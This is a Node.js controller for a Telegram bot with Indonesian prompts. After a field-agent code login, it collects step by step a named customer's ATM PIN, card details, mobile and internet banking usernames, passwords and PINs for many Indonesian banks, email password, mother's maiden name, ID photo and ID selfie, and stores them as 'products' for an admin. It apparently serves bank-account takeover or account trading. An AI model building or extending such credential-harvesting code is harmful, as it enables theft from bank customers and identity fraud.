const TelegramBot = require('node-telegram-bot-api');
const bcrypt = require('bcryptjs');
const TelegramUser = require('../models/TelegramUser');
const User = require('../models/User');
const FieldStaff = require('../models/FieldStaff');
const TelegramSubmission = require('../models/TelegramSubmission');

const token = process.env.TELEGRAM_BOT_TOKEN;
const bot = new TelegramBot(token);

const FRONTEND_URL = process.env.FRONTEND_URL || 'http://localhost:3000';

const getSteps = (bank) => {
  const commonStart = ['customer', 'bank'];
  const commonEnd = [
    'grade', 'kcp', 'nik', 'nama',
    'namaIbuKandung', 'tempatTanggalLahir', 'noRek', 'noAtm',
    'validThru', 'noHp', 'pinAtm', 'email', 'passEmail', 'expired'
  ];

  let bankSteps = [];
  const b = (bank || '').toUpperCase();
  if (b === 'BCA') {
    bankSteps = ['kodeAkses', 'pinMBca', 'myBCAUser', 'myBCAPassword', 'myBCAPin'];
  } else if (b === 'BRI') {
    bankSteps = ['brimoUser', 'brimoPassword', 'mobilePin', 'briMerchantUser', 'briMerchantPassword'];
  } else if (b === 'BNI') {
    bankSteps = ['pinWondr', 'passWondr', 'mobileUser', 'mobilePassword'];
  } else if (b === 'OCBC' || b === 'OCBC NISP') {
    bankSteps = ['mobileUser', 'mobilePassword', 'mobilePin', 'ibUser', 'ibPassword'];
  } else if (b === 'MANDIRI' || b === 'LIVIN') {
    bankSteps = ['mobileUser', 'mobilePassword', 'mobilePin'];
  } else if (b === 'DANAMON') {
    bankSteps = ['mobileUser', 'mobilePassword', 'mobilePin'];
  } else if (b === 'PERMATA') {
    bankSteps = ['mobileUser', 'mobilePassword', 'mobilePin'];
  } else if (b === 'MAYBANK') {
    bankSteps = ['mobileUser', 'mobilePassword', 'mobilePin'];
  } else if (b === 'PANIN') {
    bankSteps = ['mobileUser', 'mobilePassword', 'mobilePin'];
  } else if (bank) {
    // Default for other banks: ask for generic Mobile & IB
    bankSteps = ['mobileUser', 'mobilePassword', 'mobilePin', 'ibUser', 'ibPassword', 'ibPin'];
  }

  return [...commonStart, ...bankSteps, ...commonEnd, 'uploadFotoId', 'uploadFotoSelfie'];
};

const getBankSpecificLabel = (field, bankName) => {
  const bank = (bankName || '').toUpperCase();

  const labels = {
    customer: '👤 Masukkan nama Customer:',
    bank: '🏦 Masukkan nama Bank (BCA/BRI/MANDIRI/BNI/DLL):',
    grade: '📊 Masukkan Grade:',
    kcp: '🏢 Masukkan KCP (Kantor Cabang):',
    nik: '🆔 Masukkan NIK (16 digit):',
    nama: '📛 Masukkan Nama Lengkap sesuai KTP:',
    namaIbuKandung: '👩 Masukkan Nama Ibu Kandung:',
    tempatTanggalLahir: '📅 Masukkan Tempat/Tanggal Lahir (contoh: Jakarta, 01-01-1990):',
    noRek: '💳 Masukkan Nomor Rekening:',
    noAtm: '🏧 Masukkan Nomor Kartu ATM:',
    validThru: '📆 Masukkan Valid Thru (MM/YY):',
    noHp: '📱 Masukkan Nomor HP terdaftar:',
    pinAtm: '🔢 Masukkan PIN ATM:',
    email: '📧 Masukkan Email terdaftar:',
    passEmail: '🔑 Masukkan Password Email:',
    expired: '⏳ Masukkan Tanggal Expired (YYYY-MM-DD):',
    // Specific Fields
    kodeAkses: '🔐 Masukkan Kode Akses (BCA):',
    pinMBca: '🔢 Masukkan PIN m-BCA:',
    myBCAUser: '👤 Masukkan BCA-ID (myBCA):',
    myBCAPassword: '🔑 Masukkan Password BCA-ID (myBCA):',
    myBCAPin: '🔢 Masukkan PIN Transaksi (myBCA):',
    brimoUser: '👤 Masukkan Username BRImo:',
    brimoPassword: '🔑 Masukkan Password BRImo:',
    briMerchantUser: '🏪 Masukkan Username BRI Merchant:',
    briMerchantPassword: '🔑 Masukkan Password BRI Merchant:',
    pinWondr: '🛡️ Masukkan PIN Wondr (BNI):',
    passWondr: '🔓 Masukkan Password Wondr (BNI):',
    uploadFotoId: '📸 Silakan kirim FOTO KTP Anda:',
    uploadFotoSelfie: '📸 Terakhir, silakan kirim FOTO SELFIE dengan KTP:'
  };

  // Dynamic Labels based on field and bank
  if (field === 'mobileUser') {
    if (bank === 'MANDIRI') return "👤 Masukkan User Livin' by Mandiri:";
    if (bank === 'BNI') return "👤 Masukkan User BNI Mobile Banking:";
    if (bank === 'DANAMON') return "👤 Masukkan User D-Bank PRO:";
    if (bank === 'OCBC' || bank === 'OCBC NISP') return "👤 Masukkan User One Mobile (OCBC):";
    if (bank === 'PERMATA') return "👤 Masukkan User PermataMobile X:";
    if (bank === 'MAYBANK') return "👤 Masukkan User M2U (Maybank):";
    if (bank === 'CIMB' || bank === 'CIMB NIAGA') return "👤 Masukkan User OCTO Mobile:";
    return "👤 Masukkan Username Mobile Banking:";
  }

  if (field === 'mobilePassword') {
    if (bank === 'MANDIRI') return "🔑 Masukkan Password Livin' by Mandiri:";
    if (bank === 'BNI') return "🔑 Masukkan MPIN/Password BNI Mobile:";
    if (bank === 'DANAMON') return "🔑 Masukkan Password D-Bank PRO:";
    if (bank === 'OCBC' || bank === 'OCBC NISP') return "🔑 Masukkan Password One Mobile (OCBC):";
    if (bank === 'PERMATA') return "🔑 Masukkan Password PermataMobile X:";
    if (bank === 'MAYBANK') return "🔑 Masukkan Password M2U (Maybank):";
    if (bank === 'CIMB' || bank === 'CIMB NIAGA') return "🔑 Masukkan Password OCTO Mobile:";
    return "🔑 Masukkan Password Mobile Banking:";
  }

  if (field === 'mobilePin') {
    if (bank === 'BRI') return "🔢 Masukkan PIN BRImo:";
    if (bank === 'MANDIRI') return "🔢 Masukkan PIN Livin' by Mandiri:";
    return "🔢 Masukkan PIN Mobile Banking:";
  }

  if (field === 'ibUser') {
    if (bank === 'OCBC' || bank === 'OCBC NISP') return "👤 Masukkan User Internet Banking (OCBC):";
    return "👤 Masukkan Username Internet Banking:";
  }

  if (field === 'ibPassword') {
    if (bank === 'OCBC' || bank === 'OCBC NISP') return "🔑 Masukkan Password Internet Banking (OCBC):";
    return "🔑 Masukkan Password Internet Banking:";
  }

  return labels[field] || `Masukkan ${field}:`;
};

const setWebhook = async (req, res) => {
  const webhookUrl = req.query.url || req.body.url;
  if (!webhookUrl) {
    return res.status(400).json({
      message: 'URL webhook diperlukan.',
      hint: 'Gunakan ?url=https://alamat-railway-anda.up.railway.app'
    });
  }

  try {
    await bot.setWebHook(`${webhookUrl}/api/telegram/webhook`);
    res.status(200).json({ message: 'Webhook Telegram berhasil diatur.' });
  } catch (error) {
    console.error('Error setting Telegram webhook:', error);
    res.status(500).json({ message: 'Gagal mengatur webhook Telegram.', error: error.message });
  }
};

const askNextField = async (chatId, session) => {
  const bank = session.formData ? session.formData.bank : null;
  const steps = getSteps(bank);
  const currentIndex = session.sessionStep || 0;

  if (currentIndex >= steps.length) {
    await bot.sendMessage(chatId, '🎉 Semua data telah terkumpul! Sedang memproses pembuatan produk...');
    await submitForm(chatId, session);
    return;
  }

  const field = steps[currentIndex];
  const label = getBankSpecificLabel(field, bank);
  const opts = {
    reply_markup: {
      inline_keyboard: []
    }
  };

  // Add Back button if not first step
  const keyboardRow = [];
  if (currentIndex > 0) {
    keyboardRow.push({ text: '⬅️ Kembali', callback_data: 'prev_step' });
  }

  // Add Skip button for certain fields or all fields after bank/identity
  // For simplicity, allow skip for everything except basic identity
  const nonSkippable = ['customer', 'bank', 'nama', 'nik'];
  if (!nonSkippable.includes(field)) {
    keyboardRow.push({ text: '⏭️ Lewati', callback_data: 'skip_step' });
  }

  // Always add Cancel button
  keyboardRow.push({ text: '❌ Batal', callback_data: 'cancel_input' });

  if (keyboardRow.length > 0) {
    opts.reply_markup.inline_keyboard.push(keyboardRow);
  }

  await bot.sendMessage(chatId, label, opts);
};

const submitForm = async (chatId, session) => {
  try {
    const data = { ...session.formData };

    // Convert expired to Date if exists
    if (data.expired) {
      data.expired = new Date(data.expired);
    }

    // Add metadata
    data.codeAgen = session.kodeOrlap;
    data.telegramUserId = session.chatId;
    data.source = 'telegram';

    const submission = new TelegramSubmission(data);
    await submission.save();

    await bot.sendMessage(chatId, `✅ Produk berhasil dikirim ke Ruang Tunggu!\nCustomer: ${submission.customer}\nData Anda akan diproses oleh Admin.`);

    // Reset session
    session.state = 'idle';
    session.sessionStep = 0;
    session.formData = {};
    await session.save();

    await bot.sendMessage(chatId, 'Apa yang ingin Anda lakukan selanjutnya?', {
      reply_markup: {
        inline_keyboard: [
          [{ text: 'Input Produk Lain', callback_data: 'start_chat_input' }],
          [{ text: 'Buka Web App', web_app: { url: `${FRONTEND_URL}/telegram-form` } }]
        ]
      }
    });

  } catch (error) {
    console.error('Error submitting form via Telegram:', error);
    await bot.sendMessage(chatId, '❌ Gagal membuat produk: ' + error.message);
    session.state = 'idle';
    await session.save();
  }
};

const downloadTelegramFile = async (fileId, fieldName) => {
  try {
    const path = require('path');
    const fs = require('fs');
    const uploadsDir = path.join(__dirname, '../uploads');

    if (!fs.existsSync(uploadsDir)) {
      fs.mkdirSync(uploadsDir, { recursive: true });
    }

    // bot.downloadFile returns the path where it was saved
    const downloadedPath = await bot.downloadFile(fileId, uploadsDir);

    // Rename to our secure format
    const ext = path.extname(downloadedPath) || '.jpg';
    const fileName = `secure_tg_${Date.now()}_${fieldName}${ext}`;
    const newPath = path.join(uploadsDir, fileName);

    fs.renameSync(downloadedPath, newPath);
    return fileName;
  } catch (error) {
    console.error('Error downloading Telegram file:', error);
    throw error;
  }
};

const handleWebhook = async (req, res) => {
  const update = req.body;

  try {
    if (!update) {
      return res.status(200).send('No update');
    }

    if (update.callback_query) {
      const cq = update.callback_query;
      const chatId = cq.message.chat.id;
      const data = cq.data;
      let session = await TelegramUser.findOne({ chatId: String(chatId) });
      if (!session) {
        session = await TelegramUser.create({ chatId: String(chatId) });
      }

      if (data === 'start_chat_input') {
        session.state = 'collecting';
        session.formData = session.formData || {};
        session.sessionStep = 0;
        session.markModified('formData');
        await session.save();
        await bot.sendMessage(chatId, 'Mulai input produk via chat. Jawab pertanyaan berikut.');
        await askNextField(chatId, session);
      } else if (data === 'prev_step') {
        if (session.sessionStep > 0) {
          session.sessionStep -= 1;
          await session.save();
          await askNextField(chatId, session);
        } else {
          await bot.sendMessage(chatId, 'Ini adalah pertanyaan pertama.');
        }
      } else if (data === 'skip_step') {
        session.sessionStep += 1;
        await session.save();
        await askNextField(chatId, session);
      } else if (data === 'cancel_input') {
        session.state = 'idle';
        session.sessionStep = 0;
        session.formData = {};
        session.markModified('formData');
        await session.save();
        await bot.sendMessage(chatId, '❌ Input dibatalkan. Sesi telah direset.');
      }

      return res.status(200).send('Callback processed');
    }

    if (!update.message) {
      return res.status(200).send('No message update');
    }

    const message = update.message;
    const chatId = message.chat.id;
    const from = message.from;
    const text = message.text || '';

    let telegramUser = await TelegramUser.findOne({ chatId: String(chatId) });
    if (!telegramUser) {
      telegramUser = await TelegramUser.create({
        chatId: String(chatId),
        username: from.username,
        firstName: from.first_name,
        lastName: from.last_name,
        isBot: from.is_bot,
      });
    }

    if (text === '/start') {
      telegramUser.username = from.username;
      telegramUser.firstName = from.first_name;
      telegramUser.lastName = from.last_name;
      await telegramUser.save();

      telegramUser.state = 'awaiting_orlap_code';
      telegramUser.sessionStep = 0;
      telegramUser.formData = {};
      telegramUser.markModified('formData');
      await telegramUser.save();
      await bot.sendMessage(chatId, 'Masukkan Kode Orlap Anda untuk melanjutkan.');

      return res.status(200).send('Webhook processed');
    }

    if (text === '/cancel' || text === '❌ Batal') {
      telegramUser.state = 'idle';
      telegramUser.sessionStep = 0;
      telegramUser.formData = {};
      telegramUser.markModified('formData');
      await telegramUser.save();
      await bot.sendMessage(chatId, 'Sesi dibatalkan. Ketik /start untuk memulai kembali.');
      return res.status(200).send('Canceled');
    }

    if (telegramUser.state === 'awaiting_orlap_code' && text && !text.startsWith('/')) {
      const kode = text.trim();
      // Case-insensitive lookup
      const fs = await FieldStaff.findOne({ kodeOrlap: { $regex: new RegExp(`^${kode}$`, 'i') } });
      if (!fs) {
        await bot.sendMessage(chatId, 'Kode Orlap tidak ditemukan. Coba lagi atau hubungi admin.');
        return res.status(200).send('Orlap code not found');
      }
      telegramUser.fieldStaffId = fs._id;
      telegramUser.kodeOrlap = fs.kodeOrlap;
      telegramUser.state = 'idle';
      await telegramUser.save();
      await bot.sendMessage(chatId, 'Autentikasi berhasil. Pilih metode input:', {
        reply_markup: {
          inline_keyboard: [
            [{ text: 'Buka Form Input Produk', web_app: { url: `${FRONTEND_URL}/telegram-form` } }],
            [{ text: 'Mulai Input via Chat', callback_data: 'start_chat_input' }]
          ]
        }
      });
      return res.status(200).send('Orlap authenticated');
    }

    if (text.startsWith('/login')) {
      const parts = text.split(' ');
      if (parts.length < 3) {
        await bot.sendMessage(chatId, 'Format login: /login email password');
        return res.status(200).send('Login format prompt');
      }
      const email = parts[1];
      const password = parts.slice(2).join(' ');
      const user = await User.findOne({ email });
      if (!user) {
        await bot.sendMessage(chatId, 'User tidak ditemukan.');
        return res.status(200).send('Login failed');
      }
      const ok = await bcrypt.compare(password, user.password);
      if (!ok) {
        await bot.sendMessage(chatId, 'Password salah.');
        return res.status(200).send('Login failed');
      }
      telegramUser.userId = user._id;
      await telegramUser.save();
      await bot.sendMessage(chatId, 'Login berhasil! Akun Telegram Anda terhubung.');
      return res.status(200).send('Login success');
    }

    if (telegramUser.state === 'collecting') {
      const bank = telegramUser.formData ? telegramUser.formData.bank : null;
      const steps = getSteps(bank);

      const idx = telegramUser.sessionStep || 0;
      const field = steps[idx];
      telegramUser.formData = telegramUser.formData || {};

      // Handle photos/documents
      if (field === 'uploadFotoId' || field === 'uploadFotoSelfie') {
        const photo = message.photo ? message.photo[message.photo.length - 1] : null;
        const document = message.document;

        if (!photo && !document) {
          await bot.sendMessage(chatId, 'Silakan kirim foto atau dokumen gambar.');
          return res.status(200).send('Expected photo');
        }

        try {
          const fileId = photo ? photo.file_id : document.file_id;
          const fileName = await downloadTelegramFile(fileId, field);
          telegramUser.formData[field] = fileName;
          telegramUser.markModified('formData');
        } catch (err) {
          await bot.sendMessage(chatId, 'Gagal menyimpan foto. Coba lagi.');
          return res.status(200).send('Photo download error');
        }
      } else {
        // Handle text input
        if (!text) {
          await bot.sendMessage(chatId, 'Mohon masukkan teks yang valid.');
          return res.status(200).send('Expected text');
        }
        telegramUser.formData[field] = text;
        telegramUser.markModified('formData');
      }

      telegramUser.sessionStep = idx + 1;
      await telegramUser.save();
      await askNextField(chatId, telegramUser);
      return res.status(200).send('Collecting step');
    }

    await bot.sendMessage(chatId, 'Perintah tidak dikenal. Gunakan /start untuk memulai atau /login email password untuk menghubungkan akun.');
    return res.status(200).send('Default response');
  } catch (error) {
    console.error('Telegram webhook error:', error);
    if (update?.message?.chat?.id) {
      await bot.sendMessage(update.message.chat.id, 'Terjadi kesalahan. Coba lagi.');
    }
    return res.status(500).send('Error processing webhook');
  }
};

module.exports = {
  setWebhook,
  handleWebhook,
};
